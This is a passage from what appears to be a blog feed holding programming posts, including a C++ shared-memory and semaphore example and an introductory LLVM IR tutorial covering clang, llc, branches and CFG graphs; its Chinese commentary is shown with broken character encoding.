ok\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Proc1 shm contents: %s\\n&quot;</span>, shmptr);</span><br><span class=\"line\">   <span class=\"comment\">//detach shared memory</span></span><br><span class=\"line\">   <span class=\"built_in\">shmdt</span>(shmptr);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// é”€æ¯ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"comment\">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\\n&quot;); return -1; &#125;</span></span><br><span class=\"line\">   <span class=\"comment\">// printf(&quot;sem.destroy ok\\n&quot;);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>server.cpp</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> *shmptr = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">shm_attach</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> shmid = <span class=\"built_in\">shmget</span>( (<span class=\"type\">key_t</span>)<span class=\"number\">0x5005</span>, <span class=\"number\">1024</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( shmid == <span class=\"number\">-1</span> )</span><br><span class=\"line\">      &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;shmget() failed\\n&quot;</span>);  <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">    shmptr = (<span class=\"type\">char</span> *)<span class=\"built_in\">shmat</span>(shmid, <span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> shmid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   CSEM sem;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">// ç”¨keyå€¼0x5000 åˆå§‹ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">init</span>(<span class=\"number\">0x5000</span>)==<span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init ok\\n&quot;</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// ç­‰å¾…ä¿¡ä¿¡å·æŒ‚å‡ºï¼Œç­‰å¾…æˆåŠŸåï¼Œå°†æŒæœ‰é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">wait</span>() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait ok\\n&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">// ç”³è¯·ä¸€ä¸ªå…±äº«å†…å­˜å¹¶å°†shmptræŒ‡è¿‡å»</span></span><br><span class=\"line\">   <span class=\"type\">int</span> shmid = <span class=\"built_in\">shm_attach</span>();</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Proc2 contents is %s\\n&quot;</span>, shmptr);</span><br><span class=\"line\">   <span class=\"built_in\">memset</span>(shmptr, <span class=\"string\">&#x27;B&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">   <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// æŒ‚å‡ºä¿¡å·ç¯ï¼Œé‡Šæ”¾é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">post</span>() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post ok\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//detach shared memory</span></span><br><span class=\"line\">   <span class=\"built_in\">shmdt</span>(shmptr);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// é”€æ¯ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"comment\">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\\n&quot;); return -1; &#125;</span></span><br><span class=\"line\">   <span class=\"comment\">// printf(&quot;sem.destroy ok\\n&quot;);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>client å…ˆåˆå§‹åŒ–ä¿¡å·é‡ï¼Œç„¶åè·å–èµ„æºï¼Œç”³è¯·åˆ°å…±äº«å†…å­˜ï¼Œå†™å…¥â€™Aâ€™ï¼Œé‡Šæ”¾èµ„æº</li>\n<li>server è¿ä¸Šè¿™ä¸ªä¿¡å·é‡ï¼Œè¿ä¸Šè¿™ä¸ª shmï¼Œæ‰“å°å‡º client å†™å…¥çš„â€™Aâ€™ï¼Œè·å–èµ„æºï¼Œå†™å…¥â€™Bâ€™</li>\n<li>client é‡Šæ”¾èµ„æºä¹‹åå†çœ‹å†…å­˜ï¼Œå·²ç»å˜æˆâ€™Bâ€™çš„å½¢çŠ¶äº†</li>\n</ul>\n<p><img src=\"/2022/10/18/shared-memory-and-semaphore-machenism/2.png\" alt=\"2\"></p>\n",
            "tags": [
                "Linux"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/10/18/llvm-init/",
            "url": "https://squirre17.github.io/2022/10/18/llvm-init/",
            "title": "llvm-init",
            "date_published": "2022-10-18T02:27:10.000Z",
            "content_html": "<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install lld-12</span><br><span class=\"line\">sudo ln -s /lib/llvm-9/bin/llc /bin/llc</span><br><span class=\"line\">sudo ln -s /lib/llvm-9/bin/opt /bin/opt</span><br></pre></td></tr></table></figure>\n<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href=\"https://llvm.org/docs/LangRef.html\">LLVM Language Reference Manual â€” LLVM 16.0.0git documentation</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang -Xclang -ast-dump -fsyntax-only test.c</span><br></pre></td></tr></table></figure>\n<p>ç”Ÿæˆ AST</p>\n<ul>\n<li>-S                      Only run preprocess and compilation steps</li>\n<li>-emit-llvm         Use the LLVM representation for assembler and object files</li>\n<li>-c                      Only run preprocess, compile, and assemble steps ï¼ˆç”Ÿæˆå­—èŠ‚ç çš„ bc æ–‡ä»¶ï¼‰</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang -S -emit-llvm test.c </span><br></pre></td></tr></table></figure>\n<p>ç”Ÿæˆçš„ ir ä¸­</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define dso_local i32 @main() #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  %<span class=\"number\">1</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">0</span>, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  ret i32 <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœå¼€å¯ä¼˜åŒ–</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang -S -emit-llvm -O3 test.c</span><br></pre></td></tr></table></figure>\n<p>ä¼šç›´æ¥å˜æˆ</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define dso_local i32 @main() local_unnamed_addr #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  ret i32 <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç„¶åç”¨ llc ç”Ÿæˆæ±‡ç¼–</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">llc test.ll</span><br></pre></td></tr></table></figure>\n<p>ll åˆ° bc æ–‡ä»¶å¯ä»¥ç”¨ llvm-as<br>\n åè¿‡æ¥ç”¨ llvm-dis<br>\n æ³¨æ„ï¼Œll å’Œ bc å’Œå†…å­˜ä¸­çš„å½¢å¼æ˜¯ç­‰ä»·çš„ã€‚</p>\n<p><code>dso_local</code>  æ˜¯ä¸€ä¸ª Runtime Preemption è¯´æ˜ç¬¦ï¼Œè¡¨æ˜è¯¥å‡½æ•°ä¼šåœ¨åŒä¸€ä¸ªé“¾æ¥å•å…ƒï¼ˆå³è¯¥å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶ä»¥åŠåŒ…å«çš„å¤´æ–‡ä»¶ï¼‰å†…è§£æç¬¦å·ã€‚</p>\n<p>å¯¹äº</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.c</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">int</span> first, <span class=\"type\">int</span> second)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> first + second;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> a = <span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> b = <span class=\"number\">4</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> foo(a, b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç”Ÿæˆ</p>\n<ul>\n<li>alloca å°±æ˜¯åœ¨æ ˆä¸­åˆ†é…ç©ºé—´</li>\n<li>å…ˆæŠŠä¼ å…¥çš„å€¼æ”¾å…¥æ ˆä¸­å†æ‹¿å‡ºæ¥ï¼ˆå«©éº»çƒ¦</li>\n<li>nsw : no signed wrap</li>\n<li>æ‰€æœ‰çš„å…¨å±€å˜é‡éƒ½ä»¥ @ ä¸ºå‰ç¼€</li>\n<li>è¿™é‡Œ <code>#0</code>  ä¸ä¹‹åçš„ <code>attributes #0</code>  ç›¸å¯¹åº”</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; ModuleID = <span class=\"string\">&#x27;main.c&#x27;</span></span><br><span class=\"line\">source_filename = <span class=\"string\">&quot;main.c&quot;</span></span><br><span class=\"line\">target datalayout = <span class=\"string\">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class=\"line\">target triple = <span class=\"string\">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">@a = dso_local global i32 <span class=\"number\">5</span>, align <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class=\"line\">define dso_local i32 @foo(i32, i32) #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  %<span class=\"number\">3</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">0</span>, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">1</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">5</span> = load i32, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">6</span> = load i32, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">7</span> = add nsw i32 %<span class=\"number\">5</span>, %<span class=\"number\">6</span></span><br><span class=\"line\">  ret i32 %<span class=\"number\">7</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class=\"line\">define dso_local i32 @main() #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  %<span class=\"number\">1</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">2</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">0</span>, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">4</span>, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">3</span> = load i32, i32* @a, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = load i32, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">5</span> = call i32 @foo(i32 %<span class=\"number\">3</span>, i32 %<span class=\"number\">4</span>)</span><br><span class=\"line\">  ret i32 %<span class=\"number\">5</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">attributes #<span class=\"number\">0</span> = &#123; noinline nounwind optnone uwtable <span class=\"string\">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;disable-tail-calls&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;less-precise-fpmad&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;min-legal-vector-width&quot;</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"string\">&quot;no-frame-pointer-elim&quot;</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"string\">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class=\"string\">&quot;no-infs-fp-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;no-jump-tables&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;no-nans-fp-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;no-signed-zeros-fp-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;no-trapping-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;stack-protector-buffer-size&quot;</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"string\">&quot;target-cpu&quot;</span>=<span class=\"string\">&quot;x86-64&quot;</span> <span class=\"string\">&quot;target-features&quot;</span>=<span class=\"string\">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class=\"string\">&quot;unsafe-fp-math&quot;</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"string\">&quot;use-soft-float&quot;</span>=<span class=\"string\">&quot;false&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">!llvm.module.flags = !&#123;!<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">!llvm.ident = !&#123;!<span class=\"number\">1</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">!<span class=\"number\">0</span> = !&#123;i32 <span class=\"number\">1</span>, !<span class=\"string\">&quot;wchar_size&quot;</span>, i32 <span class=\"number\">4</span>&#125;</span><br><span class=\"line\">!<span class=\"number\">1</span> = !&#123;!<span class=\"string\">&quot;clang version 9.0.1-12 &quot;</span>&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å¯¹äºåº“å¤–å‡½æ•° è¦ä½¿ç”¨å°±éœ€è¦ declare è¿™ä¸ªå‡½æ•°çš„ç­¾å</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">declare i32 @getint()</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ¡ä»¶åˆ†æ”¯\"><a class=\"markdownIt-Anchor\" href=\"#æ¡ä»¶åˆ†æ”¯\">#</a> æ¡ä»¶åˆ†æ”¯</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//if.c</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> a = getint();</span><br><span class=\"line\">    <span class=\"type\">int</span> b = getint();</span><br><span class=\"line\">    <span class=\"type\">int</span> c = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a == b) &#123;</span><br><span class=\"line\">        c = <span class=\"number\">5</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        c = <span class=\"number\">10</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    putint(c);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define dso_local i32 @main() #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  %<span class=\"number\">1</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">2</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">3</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">0</span>, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">5</span> = call i32 (...) @getint()</span><br><span class=\"line\">  store i32 %<span class=\"number\">5</span>, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">6</span> = call i32 (...) @getint()</span><br><span class=\"line\">  store i32 %<span class=\"number\">6</span>, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">0</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">7</span> = load i32, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">8</span> = load i32, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">9</span> = icmp eq i32 %<span class=\"number\">7</span>, %<span class=\"number\">8</span></span><br><span class=\"line\">  br i1 %<span class=\"number\">9</span>, label %<span class=\"number\">10</span>, label %<span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">10</span>:                                               ; preds = %<span class=\"number\">0</span></span><br><span class=\"line\">  store i32 <span class=\"number\">5</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  br label %<span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">11</span>:                                               ; preds = %<span class=\"number\">0</span></span><br><span class=\"line\">  store i32 <span class=\"number\">10</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  br label %<span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">12</span>:                                               ; preds = %<span class=\"number\">11</span>, %<span class=\"number\">10</span></span><br><span class=\"line\">  %<span class=\"number\">13</span> = load i32, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">14</span> = call i32 (i32, ...) bitcast (i32 (...)* @putint to i32 (i32, ...)*)(i32 %<span class=\"number\">13</span>)</span><br><span class=\"line\">  ret i32 <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¯­æ³• <code>br + æ ‡å¿—ä½ + truelabel + falselabel</code></p>\n<h1 id=\"cfgå›¾\"><a class=\"markdownIt-Anchor\" href=\"#cfgå›¾\">#</a> cfg å›¾</h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">max</span><span class=\"params\">(<span class=\"type\">int</span> a, <span class=\"type\">int</span> b)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (a &gt; b) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> b;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> max(<span class=\"number\">1</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>opt -dot-cfg test.ll</code>  ç”Ÿæˆ</p>\n<p>ä¸ºäº†å¯è§†åŒ–</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y graphviz-doc libgraphviz-dev graphviz</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dot .max.dot  -Tpng -o max.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/10/18/llvm-init/image-20221018103046162.png\" alt=\"image-20221018103046162\"><br>\n å¦‚æœåœ¨ clang çš„æ—¶å€™ç”¨ O3 ç¼–è¯‘<br>\nè¿™é‡Œå°±å˜æˆäº†é€‰æ‹©å‡½æ•°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define dso_local i32 @max(i32, i32) local_unnamed_addr #<span class=\"number\">0</span> &#123;</span><br><span class=\"line\">  %<span class=\"number\">3</span> = icmp sgt i32 %<span class=\"number\">0</span>, %<span class=\"number\">1</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = select i1 %<span class=\"number\">3</span>, i32 %<span class=\"number\">0</span>, i32 %<span class=\"number\">1</span></span><br><span class=\"line\">  ret i32 %<span class=\"number\">4</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>sgt: signed greater than (<a href=\"https://releases.llvm.org/2.7/docs/LangRef.html\">LLVM Assembly Language Reference Manual</a>)</li>\n<li>The â€˜selectâ€™ instruction is used to choose one value based on a condition, without branching.</li>\n</ul>\n<h1 id=\"ssa-phi-node\"><a class=\"markdownIt-Anchor\" href=\"#ssa-phi-node\">#</a> SSA &amp; phi node</h1>\n<p>è¿™ä¸ªæ¦‚å¿µåœ¨ ghidraï¼Œå—å¤§é™æ€åˆ†æï¼Œå„ç§æ–‡ç« é‡Œéƒ½çœ‹è¿‡äº†ã€‚ã€‚<br>\nSSA form enables and simplifies a vast number of compiler optimizations, and is the de-facto standard for intermediate representations in compilers of imperative programming languages.<br>\n çœ‹è¿™ä¸ªå°±è¡Œ <a href=\"https://carstein.github.io/2020/10/22/ssa-explained.html\">SSA Explained</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 